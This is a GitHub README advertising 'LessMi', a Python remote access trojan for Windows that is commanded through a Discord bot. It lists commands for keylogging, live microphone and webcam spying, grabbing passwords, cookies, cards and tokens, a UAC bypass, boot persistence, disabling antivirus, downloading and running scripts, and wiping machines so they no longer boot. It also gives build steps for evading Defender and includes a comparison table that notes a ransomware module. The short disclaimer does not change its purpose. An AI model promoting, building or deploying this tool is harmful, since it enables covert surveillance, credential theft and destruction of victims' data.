<div align="center">

# LessMi RAT
# [Download](https://github.com/MateAGYT/LessMi/releases)

**An advanced, open-source Windows RAT written in Python, controlled entirely through Discord — with a one-click panel, simple commands, and painless installation.**

<img src="https://files.catbox.moe/vuhaid.png" width="500" />

Join our Telegram community to stay tuned of the last changes and support us!<br><br>
[![Telegram Channel](https://img.shields.io/badge/lessmi--community-blue?style=for-the-badge&logo=telegram&logoColor=white)](https://t.me/lessmi_rat)

![Language](https://img.shields.io/badge/language-Python-3776AB?logo=python&logoColor=white)
![Platform](https://img.shields.io/badge/platform-Windows-0078D6?logo=windows&logoColor=white)
![Control](https://img.shields.io/badge/control-Discord-5865F2?logo=discord&logoColor=white)
![License](https://img.shields.io/badge/license-MIT-green)
![Status](https://img.shields.io/badge/status-active-brightgreen)
![Commands](https://img.shields.io/badge/commands-250%2B-orange)
![Python](https://img.shields.io/badge/python-3.10%2B-blue?logo=python&logoColor=white)

> **`MateAGYT/LessMi` is the ONLY official repository.** Don't install or run any other repo claiming to be us, or an "advanced/paid" version!

</div>

---

# 📑 Table of contents

- [1. About](#-about)
- [2. Disclaimer & license](#-disclaimer--license)
- [3. Features](#️-features)
  - [Surveillance & media](#-surveillance--media)
  - [Display, theme & appearance](#-display-theme--appearance)
  - [Input & hardware control](#️-input--hardware-control)
  - [System & process control](#️-system--process-control)
  - [Hardware & system inventory](#-hardware--system-inventory)
  - [Recon](#-recon)
  - [Filesystem](#-filesystem)
  - [Network & persistence](#-network--persistence)
  - [Network diagnostics](#-network-diagnostics)
  - [Security & policy toggles](#️-security--policy-toggles)
  - [Trolling & pranks](#-trolling--pranks)
  - [Remote shell](#️-remote-shell)
  - [Bot control](#-bot-control)
  - [Power & destructive](#-power--destructive)
  - [Extra / hidden commands](#-extra--hidden-commands)
- [4. Why LessMi?](#-why-lessmi)
- [5. Comparison with other RATs](#-comparison-with-other-rats)
- [6. Requirements](#-requirements)
- [7. Installation & compiling](#️-installation--compiling)
  - [The builder](#-the-builder)
  - [Setting up the Discord bot](#setting-up-the-discord-bot)
- [8. Troubleshooting & FAQ](#-troubleshooting--faq)
- [9. Roadmap](#-roadmap)
- [10. VirusTotal analysis](#-virustotal-analysis)
- [11. Credits](#-credits)
- [12. Contributing](#-contributing)

---

# 🧭 About

**LessMi** is a lightweight, fully-featured Remote Administration Tool for **Windows**, written in **Python** and commanded from a **Discord bot**. There is no ugly GUI client to keep open — your "control panel" is Discord itself, so you can manage one machine or a whole fleet of them from your phone, laptop, or a friend's PC.

It ships with an **interactive button panel** covering screenshots, system control, devices, processes, trolling, files, security, power, info and tools, so beginners can click instead of memorizing commands, while power users get the full command-line speed. Type `.help` at any time to open the category menu with every command dumped straight into Discord.

LessMi is a modern, actively-maintained fork and spiritual successor to **PySilon** — a project that is now effectively **abandoned** — rebuilt with more features, more stability, and a proper install flow.

---

# ❗ Disclaimer & license

**a) Disclaimer.** Code and information in this repository are for **educational purposes only**. The creator is in **no way responsible** for any illegal or malicious activity carried out with this project. It is recommended for testing and legal activities. If you install it on someone else's computer, **ask them for permission** first.

**b) License.** This project is protected by the **MIT License**. See the [`LICENSE`](LICENSE) file for full details. You are free to use, modify, and redistribute it as long as the license and copyright notice are preserved.

---

# ⚙️ Features

> Commands use the `.` prefix. Run `.help` to list everything in-channel, by category.

## 🎥 Surveillance & media

| Command | What it does |
|---|---|
| `.ss` | Screenshot **all** connected monitors. |
| `.ss-window <title>` | Screenshot a single window matched by title. |
| `.screenrec <seconds>` | Record the screen for a chosen duration. |
| `.webcam` | Capture a picture from the webcam. |
| `.camrec <seconds>` | Record video from the selected camera. |
| `.list-cams` / `.sel-cam <id>` | List cameras and pick the default one for `.webcam`. |
| `.list-mics` / `.sel-mic <id>` | List microphones and pick the default one for `.join`. |
| `.join` / `.disconnect` | Join the **live microphone feed** 24/7, or leave it. |
| `.record <seconds>` / `.mic-record <seconds>` | Instantly record the mic and send the clip. |
| `.show-screens` / `.screen-mode <mode>` | List monitors and change the screen layout. |
| `.resolution <w> <h>` | Force a display resolution. |
| `.list-speakers` / `.set-speaker <n>` | List audio outputs and switch the active speaker. |
| `.screensaver` | Start the screensaver. |
| `.magnifier` | Open the Windows Magnifier. |
| `.eject` | Eject the optical drive. |

## 🎨 Display, theme & appearance

| Command | What it does |
|---|---|
| `.monitors-on` / `.monitors-off` | Power the displays on or off. |
| `.rotate <0\|90\|180\|270>` | Rotate the screen orientation. |
| `.dark-mode <on\|off>` | Toggle Windows dark mode. |
| `.night-light <on\|off>` | Toggle Night Light. |
| `.invert` | Invert all screen colors for 10 seconds. |
| `.set-wallpaper <file\|url>` / `.wallpaper-random` | Change the wallpaper to a file, URL or a random stock image. |
| `.accent <name\|#hex>` | Change the bot's embed accent color. |
| `.taskbar <hide\|show>` | Hide or show the taskbar. |
| `.desktop-icons <hide\|show>` | Hide or show desktop icons. |

## 🖱️ Input & hardware control

| Command | What it does |
|---|---|
| `.block-input [seconds]` | Freeze keyboard + mouse for N seconds (or permanently). |
| `.unblock-input` | Release a permanent input block. |
| `.show-cursor` / `.hide-cursor` | Show or hide the cursor. |
| `.crazy-mouse` | Jiggle the mouse randomly for 2 seconds. |
| `.key <keys>` | Press keys — supports tokens like `[ENTER]`, `[SPACE]`, `[TAB]`, `[ESC]`. |
| `.click [n]` | Send N left clicks. |
| `.chaos [n] [folder]` | Delete a random file per click. |
| `.autoclick <on\|off> [interval]` | Continuous auto-clicker. |
| `.mouse-speed <1-20>` / `.swap-mouse <on\|off>` | Pointer speed and left/right swap. |
| `.alt-f4` | Send ALT+F4 to the active window. |
| `.volume <0-100>` / `.vol-step <up\|down> [n]` | Set or step the system volume. |
| `.mute` | Mute system audio. |
| `.airplane-mode <on\|off>` | Toggle airplane mode. |
| `.bluetooth <on\|off>` | Toggle Bluetooth radios. |
| `.capslock` / `.numlock` / `.scrolllock` `<on\|off>` | Force lock-key states. |
| `.sticky-keys <on\|off>` | Toggle Sticky Keys. |
| `.unpin-all` / `.restart-taskbar` | Clear taskbar pins, restart explorer. |
| `.enable-device <n>` / `.disable-device <n>` | Manage hardware devices. |

## 🖥️ System & process control

| Command | What it does |
|---|---|
| `.tasklist` | List running processes. |
| `.proc-info <name>` | Details of a process (path, user, RAM). |
| `.taskkill <process>` / `.kill-tree <process>` | Kill a process, or it and all children. |
| `.kill-explorer` / `.start-explorer` | Kill/restart `explorer.exe` (black screen when stopped). |
| `.disable-taskmgr` / `.enable-taskmgr` | Toggle Task Manager. |
| `.disable-cmd` / `.enable-cmd` | Toggle Command Prompt. |
| `.disable-reagentc` / `.enable-reagentc` | Toggle ReAgentC (recovery). |
| `.set-critical` / `.unset-critical` | Mark the process critical (BSOD on terminate). |
| `.blacklist <proc>` / `.unblacklist <proc>` | Block a process from running. |
| `.idle-time` | Report how long the user has been idle. |
| `.set-date <date>` / `.set-hour <time>` | Change system date/time. |
| `.deactivate-windows` | Deactivate Windows. |
| `.clear-bin` | Empty the recycle bin. |
| `.services` | List running services. |
| `.installed` | List installed applications. |
| `.startup` | Show startup entries. |
| `.window-list` / `.focus <title>` / `.close-window <title>` | List, focus, or close windows by title. |
| `.clipboard` / `.set-clipboard <text>` | Read or set the clipboard. |
| `.beep` | Emit a system beep. |
| `.notepad [text]` | Open Notepad (optionally pre-filled). |
| `.godmode` | Create a GodMode folder on the desktop. |
| `.restore-point` | Create a System Restore checkpoint. |

## 🔬 Hardware & system inventory

| Command | What it does |
|---|---|
| `.sysinfo` / `.systeminfo` | Live CPU/RAM/disk usage, and the raw `systeminfo` dump. |
| `.gpu` / `.cpu` / `.motherboard` / `.bios` | GPU, CPU, baseboard and BIOS details. |
| `.disks` / `.volumes` / `.partition` | Physical disks, volumes and partitions. |
| `.drives` / `.battery` / `.uptime` / `.sysclock` | Drives, battery, uptime and system clock. |
| `.temp` | Thermal zone temperatures. |
| `.whoami` / `.env` / `.sessions` / `.users` | Identity, environment, sessions, local accounts. |
| `.hotfix` / `.antivirus` / `.drivers` / `.events` | Hotfixes, registered AV, drivers, event log. |
| `.wifi` | Dump every saved WiFi profile with its key. |

## 🔍 Recon

| Command | What it does |
|---|---|
| `.autoruns` | Every Run key (HKCU/HKLM/WOW64) and Startup-folder entry. |
| `.tasks` | Full scheduled-task table. |
| `.admins` | Members of the local Administrators group. |
| `.printers` | Installed printers, drivers and ports. |
| `.rdp` | Whether Remote Desktop is enabled. |
| `.proxy` | Read or set the system HTTP proxy. |
| `.defender-status` | Defender service state, real-time protection and signature age. |
| `.firewall-rules` | Enabled firewall rules. |
| `.power-plan <high\|balanced\|saver>` | Switch the active power scheme. |
| `.timezone [tz]` | Read or set the machine timezone. |

## 📁 Filesystem

| Command | What it does |
|---|---|
| `.ls` | List the current directory and files. |
| `.cd <path>` | Change directory. |
| `.tree` | Print the directory tree. |
| `.cat <file>` / `.tail <file> [n]` | Read a whole text file, or just its last lines. |
| `.grep <pattern> [path]` | Search file **contents** recursively. |
| `.search <pattern> [path]` | Search file **names** recursively. |
| `.biggest [path]` | Largest files under a path. |
| `.mkdir <name>` / `.mkfile <name> <text>` / `.touch <file>` | Create a folder, a text file, or touch a file. |
| `.move <a> <b>` / `.copy <a> <b>` / `.rename <a> <b>` | Move, copy or rename. |
| `.size <path>` / `.hash <file>` | Path size, SHA256 hash. |
| `.zip <src> <dest>` / `.unzip <file>` | Archive or extract. |
| `.download <file>` | Upload a file from the target to Discord. |
| `.upload` | Push an attached file to the target. |
| `.grab-url <url> [dest]` | Download a file straight from a URL. |
| `.remove <file>` | Permanently delete a file or folder. |
| `.open <file>` / `.run <file>` | Open or execute a file. |
| `.recent` / `.usb` | Recently opened files, USB history. |
| `.empty-temp` / `.hosts` | Wipe temp folders, read the hosts file. |
| `.mount-iso <file>` / `.unmount-iso <file>` | Mount or unmount an ISO. |

## 🌐 Network & persistence

| Command | What it does |
|---|---|
| `.ip-locate` | Geolocate the target by IP. |
| `.coords` | Fetch GPS / IP-based coordinates + a Maps link. |
| `.public-ip` | Report the public IP. |
| `.speedtest` | Run an internet speed test. |
| `.block-domain <d>` / `.unblock-domain <d>` | Block/unblock a domain. |
| `.block-website <url>` / `.unblock-website <url>` | Block/unblock a website. |
| `.set-dns <d1> <d2>` | Change the system DNS servers. |
| `.website <url>` | Open a URL in the default browser. |
| `.admin-check` | Report whether the RAT has admin rights. |
| `.ask-admin` | Request admin via a UAC prompt. |
| `.uac-bypass` | Attempt a UAC bypass for elevation. |
| *(startup)* | **Persistence + UAC bypass at boot**, out of the box. |

## 📡 Network diagnostics

| Command | What it does |
|---|---|
| `.ping [host]` / `.tracert [host]` | ICMP echo and route tracing. |
| `.nslookup <host>` | DNS resolution. |
| `.netstat` / `.ports` | All sockets, and listening ports only. |
| `.arp` / `.route` | ARP table, IPv4 routing table. |
| `.flushdns` / `.renewip` | Flush DNS cache, release + renew the lease. |
| `.adapters` | Adapter list with link speed and status. |
| `.nearby-wifi` | Nearby WiFi networks with BSSIDs. |
| `.shares` | SMB shares. |

## 🛡️ Security & policy toggles

| Command | What it does |
|---|---|
| `.disable-defender` / `.enable-defender` | Toggle Windows Defender real-time protection. |
| `.purge-av` | Add exclusions and disable third-party AV services (Avast, Kaspersky, ESET, Bitdefender, etc.). |
| `.firewall <on\|off>` | Toggle all firewall profiles. |
| `.bitlocker` | BitLocker volume status. |
| `.hibernate <on\|off>` / `.fastboot <on\|off>` | Hibernate and Fast Startup. |

## 🎭 Trolling & pranks

| Command | What it does |
|---|---|
| `.msg <type> <title> <message>` | Show a customizable message box. |
| `.win-notify "<title>" <message>` | Fake Windows toast notification. |
| `.jumpscare` | Trigger a fullscreen jumpscare with audio. |
| `.display-glitch [graphic]` | Overlay a glitch graphic (shows help if none given). |
| `.play <file/url>` | Play audio from a file or URL. |
| `.tts <message>` | Speak your message out loud. |
| `.minimize-all` | Minimize every window. |
| `.forkbomb` | Spawn processes until the PC chokes. |
| `.bsod` | Trigger a Blue Screen of Death. |

## ⌨️ Remote shell

| Command | What it does |
|---|---|
| `.cmd <command>` | Run a command through Command Prompt. |
| `.powershell <command>` | Run a command through PowerShell. |
| `.scriptloader <url>` | Download a `.ps1`/`.bat` script from a URL and run it. |
| `.key <keys>` | Type a string into the target. |

## 🤖 Bot control

| Command | What it does |
|---|---|
| `.say <text>` | Post a message as the bot. |
| `.purge [n]` | Bulk-delete messages in the channel. |
| `.nick <name>` | Change the bot nickname (no arg resets it). |
| `.avatar <url>` | Change the bot avatar. |
| `.status <playing\|watching\|listening\|competing> <text>` | Change the bot presence. |
| `.embed <title> \| <description>` | Post a custom embed. |
| `.guilds` | List every server the bot is in. |
| `.pingbot` | Report gateway latency. |

## 💥 Power & destructive

| Command | What it does |
|---|---|
| `.lock-pc` / `.sleep-pc` | Lock the workstation, send it to sleep. |
| `.restart-pc` / `.shutdown-pc` | Restart or shut down. |
| `.kill-pc` → `.confirm-kill` | Purge AV, kill recovery, delete the BCD store, wipe user data + System32, nuke the partition table → **unbootable** (cannot be undone). |
| `.implode` | Self-destruct, leaving no evidence. |
| `.exit` | Close the RAT until reboot or forced reopen. |
| `.update` | Push a newer compiled build via an attached file. |

## 🕵️ Extra / hidden commands

| Command | What it does |
|---|---|
| `.help` | Open the category menu with the full command reference. |
| `.keylogger-enable` / `.keylogger-disable` | Toggle the keylogger. |
| `.keylog` | Flush the keylog buffer to `#keys` immediately. |
| `.grab all` / `.take all` | Grab **passwords, Discord tokens, browser history, cookies, and IP** in one shot. |
| `.grab <mode>` / `.take <mode>` | Single-mode grab: `cookies`, `history`, `cards`, `games`, `discord`, `passwords`, `vm`. |
| `.grabber [url]` | Fetch and run the grabber standalone. |
| `.discord-diag` | Diagnostic dump of Discord installs and tokens. |
| `.leave-all` | Make the bot leave every server it's in. |
| `.clean` | Clear all channels. |

---

# 🏆 Why LessMi?

- **Free and open source** — MIT licensed, no paywall, no "pro tier".
- **Discord-native control** — manage machines from any device that runs Discord.
- **Button panel + commands** — friendly for beginners, fast for pros.
- **Batteries included** — persistence, UAC bypass, keylogger, **working grabber**, live mic, and self-destruct all built in.
- **Real inventory** — WMI hardware, security posture, network diagnostics, autoruns, scheduled tasks and event logs, not just a tasklist.
- **Builder that fights back** — self-elevation, Defender exclusions before the copy, token rotation, binary hardening and an archive check before deploying.
- **Active** — maintained by a single dedicated author, unlike its abandoned ancestors.
- **Honest about lineage** — based on PySilon, rebuilt and extended.

---

# 📊 Comparison with other RATs

> `✅` full · `🟡` partial/plugin · `❌` none · `💀` abandoned · `⚠️` paid/limited

| Feature / RAT | **LessMi** | PySilon | QuasarRAT | AsyncRAT | Venom RAT | NanoCore | njRAT |
|---|---|---|---|---|---|---|---|
| Language | **Python** | Python | C# (.NET) | C# (.NET) | C# (.NET) | C# (.NET) | VB.NET |
| Control interface | **Discord** | Discord | Desktop GUI | Desktop GUI | Desktop GUI | Desktop GUI | Desktop GUI |
| License | **MIT** | MIT | MIT | MIT | Closed | Closed | Closed |
| Maintained | **✅ Active** | 💀 Abandoned | 🟡 | ✅ | ✅ | 🟡 | 💀 |
| Price | **Free** | Free | Free | Free | Free | ⚠️ | Free |
| Open source | **✅** | ✅ | ✅ | ✅ | 🟡 | ❌ | ❌ |
| One-click installer | **✅** | 🟡 | ❌ | ❌ | ❌ | ❌ | ❌ |
| Source filter before build | **✅** | ❌ | ❌ | ❌ | ❌ | ❌ | ❌ |
| Token rotation / failover | **✅** | ❌ | ❌ | ❌ | ❌ | ❌ | ❌ |
| Binary hardening + archive check | **✅** | 🟡 | 🟡 | 🟡 | ✅ | 🟡 | 🟡 |
| Auto-elevating builder | **✅** | ❌ | ❌ | ❌ | ❌ | ❌ | ❌ |
| Discord button panel | **✅** | ❌ | ❌ | ❌ | ❌ | ❌ | ❌ |
| Persistence at boot | **✅** | 🟡 | 🟡 | 🟡 | 🟡 | 🟡 | 🟡 |
| UAC bypass | **✅** | 🟡 | 🟡 | 🟡 | ✅ | 🟡 | 🟡 |
| Self-destruct | **✅** | ✅ | 🟡 | 🟡 | ✅ | 🟡 | ❌ |
| Live microphone | **✅** | ✅ | ❌ | ❌ | 🟡 | 🟡 | ❌ |
| Keylogger | **✅** | ✅ | 🟡 | ✅ | ✅ | ✅ | ✅ |
| Webcam | **✅** | ✅ | ✅ | 🟡 | ✅ | ✅ | ✅ |
| Camera video recording | **✅** | ❌ | 🟡 | ❌ | 🟡 | ❌ | ❌ |
| Multi-monitor screenshot | **✅** | ✅ | ✅ | 🟡 | ✅ | ✅ | 🟡 |
| Single-window screenshot | **✅** | ❌ | 🟡 | 🟡 | 🟡 | 🟡 | 🟡 |
| File manager (download/upload) | **✅** | ✅ | ✅ | ✅ | ✅ | ✅ | ✅ |
| Content grep + largest-files scan | **✅** | 🟡 | 🟡 | 🟡 | 🟡 | 🟡 | 🟡 |
| Remote shell | **✅** | ✅ | ✅ | ✅ | ✅ | ✅ | ✅ |
| Ransomware module | **✅** | ✅ | ❌ | ❌ | ❌ | ❌ | ❌ |
| Grabber (`grab all`) | **✅** | ✅ | 🟡 | 🟡 | ✅ | ✅ | 🟡 |
| Trolling / pranks | **✅ Rich** | 🟡 | 🟡 | ❌ | 🟡 | 🟡 | 🟡 |
| Display control (rotate/mode/resolution) | **✅** | 🟡 | 🟡 | 🟡 | 🟡 | 🟡 | 🟡 |
| Theme control (dark mode/night light/invert) | **✅** | ❌ | 🟡 | ❌ | ❌ | 🟡 | ❌ |
| Accent / embed theming | **✅** | ❌ | ❌ | ❌ | ❌ | ❌ | ❌ |
| Auto-clicker + click-to-delete | **✅** | ❌ | 🟡 | ❌ | 🟡 | 🟡 | 🟡 |
| Clipboard access | **✅** | 🟡 | 🟡 | 🟡 | 🟡 | ✅ | ✅ |
| Hardware inventory (WMI) | **✅** | 🟡 | ✅ | 🟡 | 🟡 | 🟡 | 🟡 |
| Autoruns / scheduled-task recon | **✅** | 🟡 | 🟡 | 🟡 | 🟡 | 🟡 | 🟡 |
| Network diagnostics (ping/tracert/netstat) | **✅** | 🟡 | 🟡 | 🟡 | 🟡 | 🟡 | 🟡 |
| Firewall / BitLocker / policy toggles | **✅** | 🟡 | 🟡 | 🟡 | 🟡 | 🟡 | 🟡 |
| AV purge + Defender exclusion | **✅** | 🟡 | ❌ | ❌ | 🟡 | ❌ | ❌ |
| Device enable/disable | **✅** | ❌ | 🟡 | 🟡 | 🟡 | 🟡 | 🟡 |
| File hashing / zip / search | **✅** | 🟡 | 🟡 | 🟡 | 🟡 | 🟡 | 🟡 |
| Multiple PCs at once | **✅** | ✅ | ✅ | ✅ | ✅ | ✅ | ✅ |
| No GUI to keep open | **✅** | ✅ | ❌ | ❌ | ❌ | ❌ | ❌ |
| Works over mobile Discord | **✅** | ✅ | ❌ | ❌ | ❌ | ❌ | ❌ |

**Notes on the field:**

- **PySilon** — LessMi's direct ancestor. Great design, but development stalled; bugs linger and dependencies drift. LessMi exists precisely to fill that gap.
- **QuasarRAT / AsyncRAT / Venom / NanoCore / njRAT** — the classic **C# desktop-GUI** RATs. Powerful and mature, but you must keep the client open on your own machine, they're harder to use from a phone, and most need extra setup for persistence/UAC. NanoCore and Venom are closed-source; njRAT is long abandoned.
- **Why Discord wins** — with LessMi the "client" is a bot you already have open. No ports, no NAT punching, no separate controller app.

> ⚖️ *Comparison reflects general project characteristics at the time of writing; features change. Contributions to keep this table accurate are welcome.*

---

# 📋 Requirements

**On the compiling machine (yours):**

- Windows 10/11 (x64 recommended)
- [Python 3.10+](https://www.python.org/downloads/) — check **"Add Python to PATH"** during install
- Administrator rights for the builder (it auto-elevates)
- A Discord bot token + channel (see setup below)
- A Discord account
- ~1 GB free disk for dependencies

**On the target machine:**

- Windows 10/11 (x64)
- Internet access
- No Python needed — the build is compiled to a standalone `.exe`

---

# 🛠️ Installation & compiling

1. **Download Python** from its official website, on a Windows system. Disable your antivirus first (it will scream at a fresh RAT), then run **`Compile-Windows.bat`**.
2. **Wait** while dependencies install, then enter your **bot details** when prompted.
3. **Click compile** and wait for the RAT to build.
4. **Done!** You now have your own LessMi RAT `.exe` ready to deploy.

### The builder

The builder is not a thin wrapper around PyInstaller. Before you press COMPILE it already knows what it has to do:

- **Auto-elevation.** If it isn't running as admin it relaunches itself with UAC, so persistence and exclusions always apply.
- **Token validation.** The main token is checked against the Discord format before anything is built — a bad paste fails at build time instead of at the target.
- **Token rotation.** Two backup tokens can be supplied; the payload tries them in order and only gives up after all three.
- **Startup logging.** Every boot writes to `boot.log` in the app directory, so a silent failure is never really silent.
- **Source filter.** Every command and every startup/runtime feature can be toggled off before building, so you ship only what you need and avoid duplicate persistence vectors.
- **Defender exclusions first.** The destination folder, the payload and the extraction directory are excluded *before* the copy, not after.
- **Hardening + verification.** The binary is hardened (section names, timestamp, Rich header re-key, padding) and then re-opened with PyInstaller's archive viewer; if the archive no longer parses, the build is rejected instead of shipped.
- **Cleanup on rebuild.** Previous tasks, folder and `Userinit` entry are removed before installing the new one.

### Setting up the Discord bot

1. Go to the [Discord Developer Portal](https://discord.com/developers/applications) → **New Application**.
2. Open the **Bot** tab → **Reset Token** → copy the token.
3. Enable **Privileged Gateway Intents** → turn on **Message Content Intent** (and *Server Members* if needed).
4. Invite the bot to your private server with the **bot** + **applications.commands** scopes.
5. Grab your **channel ID** (right-click channel → *Copy ID*, with Developer Mode on).
6. Paste the token and channel ID into the config when the compiler asks.

---

# 🔧 Troubleshooting & FAQ

**The bot doesn't respond.**
Check that **Message Content Intent** is enabled, the token is correct, and the bot can read/send in the target channel.

**The builder says the token is invalid.**
The token was copied with a missing character or with an extra prefix. Reset it in the Developer Portal and paste it again — the builder validates the format on purpose.

**The bot starts and dies instantly.**
Look at `boot.log` in the app directory. If it says `login failure`, the token is revoked; if it says `all tokens failed`, add a backup token. If the log is empty, the payload never got to run — check that the build passed the archive verification.

**Windows Defender / SmartScreen flags it.**
Normal for a fresh, unsigned RAT. Add an exclusion folder, or sign the binary. First-run may also need *"More info → Run anyway"*. The builder already adds exclusions for its own payload; `.purge-av` handles the rest.

**The builder warns about tamper protection.**
Defender refused the exclusions. Turn off *Tamper Protection* in Windows Security, or add the folder manually, then rebuild.

**The builder says the archive is corrupt after hardening.**
The hardening step broke the PyInstaller cookie. Rebuild; if it persists, disable hardening for that build and check your PyInstaller version.

**`.webcam` / `.camrec` / `.join` fails.**
Confirm a camera/mic exists and is selected via `.list-cams` / `.sel-cam` and `.list-mics` / `.sel-mic`. Some virtual devices misreport — pick a physical one.

**`.admin-check` says no admin.**
Run the build elevated, use `.ask-admin`, or try `.uac-bypass`.

**`.grab all` opens consoles but sends nothing.**
Make sure the `resources/` scripts exist alongside the build, and that the target has `python` available for the sub-scripts. Output is written to fresh consoles on the target.

**`.grab`/`.grabber` reports a missing `grab.py`.**
The build normally fetches it on demand — check connectivity to GitHub, or drop `grab.py` into `resources/` manually.

**`.grep` or `.biggest` seems stuck.**
They skip `AppData`, `node_modules`, `.git` and similar, and stop after 4000 directories. Point them at a narrower path if you need speed.

**`.resolution` / `.rotate` blanked the screen.**
A mode the panel doesn't support got applied. Reboot, or set a known-good resolution back with `.resolution 1920 1080`.

**Compile fails on dependencies.**
Update `pip` (`python -m pip install --upgrade pip`) and re-run the `.bat`. Ensure you're on a real Windows machine, not Wine.

**I executed `.monitors-off` and now it's black.**
That's intended — run `.monitors-on`. Same for `.kill-explorer` → `.start-explorer`.

**Is it cross-platform?**
Windows only. macOS/Linux are not supported (yet).

---

# 🗺️ Roadmap

- [ ] **Slash commands** — clone every prefix command as a slash command.
- [x] ~~Restore the **`grab all` grabber** module.~~ ✅ **Done — fully available.**
- [x] ~~Source filter, token rotation, build verification in the builder.~~ ✅ **Done.**
- [ ] Even more commands (always).
- [ ] Signed release binaries to reduce AV false positives.
- [ ] Optional multi-bot sharding for large fleets.
- [ ] Persisted per-machine command history and scheduled jobs.

---

# 🦠 VirusTotal analysis

<div align="center">
  <a href="https://www.virustotal.com/gui/file-analysis/ZGQ4MDA4NjZiYmNlYzhhOTNhZDExM2Y0MDEyMzkzYTU6MTc5MzMxMzc3MQ==?nocache=1">
    <img src="https://thumb.wikimedia.org/wikipedia/commons/thumb/b/b7/VirusTotal_logo.svg/1280px-VirusTotal_logo.svg.png?utm_source=es.wikipedia.org&utm_campaign=index&utm_content=thumbnail" alt="VirusTotal Analysis" height="80" />
  </a>
  <br />
  <sub>9/62 detections — <a href="https://www.virustotal.com/gui/file-analysis/ZGQ4MDA4NjZiYmNlYzhhOTNhZDExM2Y0MDEyMzkzYTU6MTc5MzMxMzc3MQ==?nocache=1">See the full report in VirusTotal.</a></sub>
</div>

---

# 🙏 Credits

- **PySilon** — original concept and foundation that LessMi is based on. ❤️
- **`discord.py`** and the wider Python ecosystem.
- **You** — for using and testing it.

---

# 🤝 Contributing

1. Fork the repo.
2. Create a branch: `git checkout -b feature/my-thing`.
3. Commit your changes.
4. Open a Pull Request.

Bug reports, feature ideas, and improvements to this README (especially keeping the comparison table honest) are all welcome.

---

<div align="center">

**LessMi RAT** — made with 🐍 for Windows, controlled from Discord.
⭐ Star the repo if it helped you.

</div>